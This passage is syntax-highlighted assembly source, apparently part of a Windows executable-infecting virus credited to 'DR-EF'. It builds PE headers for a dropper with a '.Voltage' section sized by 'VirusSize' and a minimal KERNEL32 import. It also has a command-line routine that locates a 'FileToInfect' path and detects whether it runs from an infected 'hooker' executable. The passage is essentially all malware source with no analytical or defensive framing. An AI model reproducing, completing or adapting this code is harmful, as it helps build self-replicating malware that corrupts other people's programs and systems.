        </span><span class="sc5">OH_SizeOfImage</span><span class="sc0">                  </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc2">8000h</span><span class="sc0">
        </span><span class="sc5">OH_SizeOfHeaders</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc5">SizeOfHeaders</span><span class="sc0">
        </span><span class="sc5">OH_CheckSum</span><span class="sc0">                     </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">OH_Subsystem</span><span class="sc0">                    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0002h</span><span class="sc0">
        </span><span class="sc5">OH_DllCharacteristics</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">OH_SizeOfStackReserve</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00100000h</span><span class="sc0">
        </span><span class="sc5">OH_SizeOfStackCommit</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00002000h</span><span class="sc0">
        </span><span class="sc5">OH_SizeOfHeapReserve</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc2">00100000h</span><span class="sc0">
        </span><span class="sc5">OH_SizeOfHeapCommit</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc2">00001000h</span><span class="sc0">
        </span><span class="sc5">OH_LoaderFlags</span><span class="sc0">                  </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">OH_NumberOfRvaAndSizes</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00000010h</span><span class="sc0">


    </span><span class="sc1">;pe data directory</span><span class="sc0">
    
        </span><span class="sc5">DE_Export</span><span class="sc0">       </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">

        </span><span class="sc1">;DE_Import:     </span><span class="sc0">
        </span><span class="sc5">DD_VirtualAddress_</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc5">ImportSectionInTheMemory</span><span class="sc0">
        </span><span class="sc5">DD_Size_</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc5">SizeOfImportSection</span><span class="sc0">
            
        </span><span class="sc5">DE_Resource</span><span class="sc0">         </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">DE_Exception</span><span class="sc0">        </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">DE_Security</span><span class="sc0">         </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">DE_BaseReloc</span><span class="sc0">        </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">DE_Debug</span><span class="sc0">        </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">DE_Copyright</span><span class="sc0">        </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">DE_GlobalPtr</span><span class="sc0">        </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">DE_TLS</span><span class="sc0">          </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">DE_LoadConfig</span><span class="sc0">       </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">DE_BoundImport</span><span class="sc0">      </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">DE_IAT</span><span class="sc0">          </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">DE_Reserved1</span><span class="sc0">        </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">DE_Reserved2</span><span class="sc0">        </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">DE_Reserved3</span><span class="sc0">        </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">

        
        </span><span class="sc5">SizeOfPeOptionalHeader</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Pe_OptionalHeader</span><span class="sc4">)</span><span class="sc0">
        

        </span><span class="sc1">;wvltg's code section</span><span class="sc0">
        
        </span><span class="sc5">SH_Name</span><span class="sc0">             </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc3">".Voltage"</span><span class="sc0">
        </span><span class="sc5">SH_VirtualSize</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc5">VirusSize</span><span class="sc0">
        </span><span class="sc5">SH_VirtualAddress</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc5">SH_SizeOfRawData</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">VirusSize</span><span class="sc4">+(</span><span class="sc2">200h</span><span class="sc4">-(</span><span class="sc5">VirusSize</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc4">)))</span><span class="sc0">
        </span><span class="sc5">SH_PointerToRawData</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">600h</span><span class="sc0">
        </span><span class="sc5">SH_PointerToRelocations</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SH_PointerToLinenumbers</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SH_NumberOfRelocations</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SH_NumberOfLinenumbers</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SH_Characteristics</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0C0000000h</span><span class="sc0">

        </span><span class="sc1">;wvltg's import section     </span><span class="sc0">
        
        </span><span class="sc5">SH_Name__</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc3">"(c)DR-EF"</span><span class="sc0">
        </span><span class="sc5">SH_VirtualSize__</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc5">SizeOfImportSection</span><span class="sc0">
        </span><span class="sc5">SH_VirtualAddress__</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc5">ImportSectionInTheMemory</span><span class="sc0">
        </span><span class="sc5">SH_SizeOfRawData__</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">SizeOfImportSection</span><span class="sc4">+(</span><span class="sc2">200h</span><span class="sc4">-(</span><span class="sc5">SizeOfImportSection</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc4">)))</span><span class="sc0">
        </span><span class="sc5">SH_PointerToRawData__</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc5">ImportSectionInFile</span><span class="sc0">
        </span><span class="sc5">SH_PointerToRelocations__</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SH_PointerToLinenumbers__</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SH_NumberOfRelocations__</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SH_NumberOfLinenumbers__</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SH_Characteristics__</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">040000040h</span><span class="sc0">
        
        
        </span><span class="sc5">SizeOfHeaders</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">VirusHeaders</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc5">ImportSectionInFile</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc2">600h</span><span class="sc4">+</span><span class="sc5">VirusSize</span><span class="sc4">+(</span><span class="sc2">200h</span><span class="sc4">-(</span><span class="sc5">VirusSize</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc4">)))</span><span class="sc0">
                            
        </span><span class="sc5">ImportSectionInTheMemory</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc2">1000h</span><span class="sc4">+</span><span class="sc5">VirusSize</span><span class="sc4">+(</span><span class="sc2">1000h</span><span class="sc4">-(</span><span class="sc5">VirusSize</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc4">)))</span><span class="sc0">
                            


</span><span class="sc5">ImportSection</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;dummy import section</span><span class="sc0">


        </span><span class="sc5">ID_OriginalFirstThunk</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">ImportSectionInTheMemory</span><span class="sc4">+</span><span class="sc5">IMAGE_THUNK_DATA</span><span class="sc4">-</span><span class="sc5">ImportSection</span><span class="sc4">)</span><span class="sc0">       
        </span><span class="sc5">ID_TimeDateStamp</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">ID_ForwarderChain</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">ID_Name</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">ImportSectionInTheMemory</span><span class="sc4">+</span><span class="sc5">DLL_NAME</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ImportSection</span><span class="sc4">)</span><span class="sc0">      
        </span><span class="sc5">ID_FirstThunk</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">ImportSectionInTheMemory</span><span class="sc4">+</span><span class="sc5">IMAGE_THUNK_DATA</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ImportSection</span><span class="sc4">)</span><span class="sc0">  

        </span><span class="sc9">dd</span><span class="sc0">           </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;empty IID=end of iid array</span><span class="sc0">

</span><span class="sc5">IMAGE_THUNK_DATA</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">TD_AddressOfData</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">ImportSectionInTheMemory</span><span class="sc4">+</span><span class="sc5">IMPORT_BY_NAME</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ImportSection</span><span class="sc4">)</span><span class="sc0">           
        </span><span class="sc5">TD_Ordinal</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">                 
        </span><span class="sc5">TD_Function</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0"> 
        </span><span class="sc5">TD_ForwarderString</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                   


        </span><span class="sc5">DLL_NAME</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"KERNEL32.DLL"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">IMPORT_BY_NAME</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">IBN_Hint</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">IBN_Name</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">    </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  



        </span><span class="sc5">SizeOfImportSection</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">ImportSection</span><span class="sc4">)</span><span class="sc0">



</span><span class="sc5">ProcessCommandLine</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;set SEH to avoid errors</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CMDProcess_Err</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">HookerInformation</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SizeOfHookerInformation</span><span class="sc0">
</span><span class="sc5">@Blank</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;blank some variable to avoid errors</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@Blank</span><span class="sc0">              </span><span class="sc1">;in next generations                </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RunFromExeHooker</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetCommandLine</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@l1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;get file path</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'"'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@l1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc4">],</span><span class="sc12">'"'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitProcessCMD</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitProcessCMD</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileToInfect</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@l2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc12">'"'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">CpyParm</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@l2</span><span class="sc0">
</span><span class="sc5">CpyParm</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;check if there is command line parameter</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitCommandLineProc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;copy the file path to the command line</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileToInfect</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CommandLine</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CommandLine</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">      </span><span class="sc1">;add space</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CommandLine</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
</span><span class="sc5">@l3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitCommandLineProc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@l3</span><span class="sc0">
</span><span class="sc5">ExitCommandLineProc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileToInfect</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get file directory</span><span class="sc0">
</span><span class="sc5">@l4</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;goto end of file name</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;get file path size</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@l4</span><span class="sc0">
</span><span class="sc5">@l5</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@l5</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileDirectory</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileToInfect</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetCommandLine</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;check if we running</span><span class="sc0">
</span><span class="sc5">ishook</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">             </span><span class="sc1">;from the exe file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;hooker file or just</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExeHookerName</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;from infected exe</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">               </span><span class="sc1">;that executed with</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nxt_c</span><span class="sc0">               </span><span class="sc1">;command line.</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RunFromExeHooker</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitProcessCMD</span><span class="sc0">
</span><span class="sc5">nxt_c</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ishook</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ExitProcessCMD</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CMDProcess_Err</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;remove SEH</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    
    
    </span><span class="sc5">HookerInformation</span><span class="sc4">:</span><span class="sc0">
    
